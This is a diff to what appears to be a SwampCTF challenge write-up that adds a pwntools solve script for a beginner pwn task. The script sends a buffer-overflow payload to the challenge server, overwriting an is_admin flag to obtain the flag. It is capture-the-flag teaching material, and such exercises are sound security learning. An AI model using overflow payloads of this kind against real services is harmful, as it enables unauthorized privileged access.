@@ -62,7 +62,32 @@ swampCTF{f1l3_r34d_4nd_d3s3r14l1z3_pwn4g3_x7q9z2r5v8}
 ![image](https://github.com/user-attachments/assets/708c2055-022e-4c34-a702-e39f67354b5a)
 
 - Solve script
+python3[from pwn import *
 
+# Set up connection to the challenge server
+HOST = "chals.swampctf.com"
+PORT = 40004
+
+# Buffer overflow payload
+payload = b"A" * 10 + b"\x01\x00\x00\x00"  # Overwrite is_admin to 1 (true)
+
+# Start interaction
+p = remote(HOST, PORT)
+p.recvuntil(b"please enter your name: ")
+p.sendline(payload)
+
+# Read output to check if admin
+print(p.recv().decode())
+
+# Send "y" to print flag
+p.sendline(b"y")
+
+# Receive and print flag
+print(p.recvall().decode())
+
+# Close connection
+p.close()
+]
  
 ### Challenge: Beginner Pwn 2
 ![image](https://github.com/user-attachments/assets/cc125998-d69a-423d-b5e8-3bdd7eebf32e)
